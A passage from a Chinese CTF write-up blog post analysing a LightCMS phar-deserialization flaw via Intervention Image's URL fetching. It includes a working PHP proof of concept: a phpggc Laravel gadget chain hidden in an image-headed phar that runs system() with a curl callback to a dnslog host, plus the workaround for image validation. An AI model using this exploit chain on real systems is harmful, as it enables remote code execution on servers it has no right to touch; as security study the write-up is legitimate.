class="variable">$v</span>,</span><br><span class="line">            <span class="string">&#x27;state&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;list&#x27;</span> =&gt; <span class="variable">$urls</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 <code>fetchImageFile()</code> 方法。该方法可简化成如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchImageFile</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//拉取远程文件</span></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$options</span> =  [</span><br><span class="line">        CURLOPT_URL =&gt; <span class="variable">$url</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_USERAGENT =&gt; <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);</span><br><span class="line">    <span class="comment">//$data为远程文件内容</span></span><br><span class="line">    <span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">    curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    </span><br><span class="line">	<span class="comment">// !!重点方法!!</span></span><br><span class="line">	<span class="variable">$image</span> = Image::make(<span class="variable">$data</span>);</span><br><span class="line">    <span class="comment">// !!重点方法!!</span></span><br><span class="line">	</span><br><span class="line">    <span class="comment">//获取文件的MIME类型</span></span><br><span class="line">    <span class="variable">$mime</span> = <span class="variable">$image</span>-&gt;mime();</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;extension&#x27;</span> =&gt; <span class="variable">$extension</span> ?? (<span class="variable">$mime</span> ? strtolower(explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$mime</span>)[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$data</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Image 是一个 Facade。具体的 Facade逻辑可以暂时不用理会，只需知道 Facade 的 <code>__callStatic()</code> 有一段代码 <code>$instance-&gt;$method(...$args);</code> 即可。</p>
+<p><code>Image::make()</code> 最终调用了 <code>Intervention\Image\ImageManager make()</code> 方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Intervention\Image\ImageManager</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//createDriver()将实例化Intervention\Image\Gd\Driver类并返回</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;createDriver()-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\Gd\Driver <span class="keyword">extends</span> \Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">Decoder <span class="variable">$decoder</span> = <span class="literal">null</span>, Encoder <span class="variable">$encoder</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">//执行完这个 __construct() 后，会自动执行抽象父类 AbstractDriver 的 init()方法</span></span><br><span class="line">    <span class="comment">//具体好像是PHP的某个机制使得其会自动调用init()。还没深究</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;decoder = <span class="variable">$decoder</span> ? <span class="variable">$decoder</span> : <span class="keyword">new</span> Decoder;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;encoder = <span class="variable">$encoder</span> ? <span class="variable">$encoder</span> : <span class="keyword">new</span> Encoder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDriver</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;decoder-&gt;init(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">====================</span><br><span class="line">Intervention\Image\AbstractDecoder</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">	<span class="comment">//根据远程文件的内容，执行不一样的方法</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        .....</span><br><span class="line">        <span class="comment">//上传文件是图片（二进制数据），则为true</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isBinary():</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">        <span class="comment">//若文件内容是一串url，则为true</span></span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">$this</span>-&gt;isUrl():</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromUrl(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个switch派生了这个漏洞需要利用的两个分支：phar反序列化的点 及 上传phar文件的点。</p>
+<h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>进入 <code>case $this-&gt;isUrl()</code>分支，跟进 <code>$this-&gt;initFromUrl()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromUrl</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">	<span class="comment">//!!重点方法!!</span></span><br><span class="line">    <span class="comment">//$url可控，为远程文件内容。若指定为一个phar文件即可触发反序列化</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> = @file_get_contents(<span class="variable">$url</span>, <span class="literal">false</span>, <span class="variable">$context</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;initFromBinary(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//!!重点方法!!</span></span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="上传phar文件"><a href="#上传phar文件" class="headerlink" title="上传phar文件"></a>上传phar文件</h3><p>进入 <code>case $this-&gt;isBinary()</code>分支，跟进 <code>$this-&gt;initFromBinary()</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initFromBinary</span>(<span class="params"><span class="variable">$binary</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$resource</span> = @imagecreatefromstring(<span class="variable">$binary</span>);</span><br><span class="line">    <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;initFromGdResource(<span class="variable">$resource</span>);</span><br><span class="line">    <span class="comment">//获取文件MIME类型</span></span><br><span class="line">    <span class="comment">//CVE-2021-27112的补丁就是根据这里获取的文件头作为MIME类型来限制后缀，导致我们只能保存图片类型的后缀</span></span><br><span class="line">    <span class="comment">//不过文件后缀和文件头对phar文件没有影响，只要内容格式正确即可</span></span><br><span class="line">    <span class="variable">$image</span>-&gt;mime = finfo_buffer(finfo_open(FILEINFO_MIME_TYPE), <span class="variable">$binary</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$image</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>综上分析，我们可以得出这样一个利用链：<strong>首先上传一个文件头是图片类型的phar文件，phar文件内容为 phpggc 中laravel6.x的反序列化链。获取到phar文件上传路径后，然后再上传一个“URL文件”，内容为phar路径的文件。即可触发phar反序列化</strong></p>
+<h2 id="POC编写"><a href="#POC编写" class="headerlink" title="POC编写"></a>POC编写</h2><p>按照正常逻辑，我们的POC如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//链子从phpggc扒拉下来的</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>, <span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher(<span class="variable">$function</span>); </span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Queue\CallQueuedClosure(<span class="variable">$parameter</span>); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Queue</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CallQueuedClosure</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$parameter</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//设置GIF文件头</span></span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 xxd 查看文件结构：</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-4.png" width="600px">
+
+<p>请求如下：</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-3.png" width="800px">
+
+<p>然后。。。就报错了。。。由于下载远程图片时使用了 <code>imagecreatefromstring()</code>。而我们的 <em>phar.jpg</em> 不是一个正规的图片，导致该方法无法正常生成图片，遂报错。。。</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-2.png" width="800px">
+
+<p>解决办法也挺简单，只需要在文件中存在有 <code>&lt;?php __HALT_COMPILER(); ?&gt;</code> 即可。哪怕它位于文件的末尾也是可行的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">	$o = new \Illuminate\Broadcasting\PendingBroadcast(&#x27;system&#x27;,&#x27;curl xxx1.8ogfme.dnslog.cn&#x27;);</span><br><span class="line">	<span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="comment">//在文件头处放一个正常图片即可</span></span><br><span class="line">	<span class="variable">$f</span> = file_get_contents(<span class="string">&quot;222222.png&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setStub(<span class="variable">$f</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line">    rename(<span class="string">&#x27;phar.phar&#x27;</span>,<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>程序成功返回上传文件路径：</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-5.png" width="1000px">
+
+<p>根据文件路径构造 “URL文件” 的内容：</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-6.png" width="500px">
+
+<p>此时再次请求，成功执行命令：</p>
+<img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-7.png" width="800px">
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/LightCMS/" rel="tag"># LightCMS</a>
+          
+            <a href="/tags/Yii2/" rel="tag"># Yii2</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/03/24/2021-03-24-php-design-patterns/" rel="next" title="PHP设计模式学习">
+                <i class="fa fa-chevron-left"></i> PHP设计模式学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/05/12/2021-05-12-ysoserial-urldns/" rel="prev" title="ysoserial学习之 - URLDNS">
+                ysoserial学习之 - URLDNS <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">25</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
+                      
+                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
+                      
+                        <i class="fa fa-fw fa-globe"></i>安全客</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB2-Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.</span> <span class="nav-text">WEB2 - Yii2反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB4-LightCMS-0day"><span class="nav-number">2.</span> <span class="nav-text">WEB4 - LightCMS 0day</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E7%82%B9-Laravel-%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="nav-number">2.1.</span> <span class="nav-text">补充点 Laravel 的知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E7%94%B1%E3%80%81%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="nav-number">2.1.1.</span> <span class="nav-text">路由、控制器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E9%80%BB%E8%BE%91"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.2.1.</span> <span class="nav-text">phar反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0phar%E6%96%87%E4%BB%B6"><span class="nav-number">2.2.2.</span> <span class="nav-text">上传phar文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC%E7%BC%96%E5%86%99"><span class="nav-number">2.3.</span> <span class="nav-text">POC编写</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
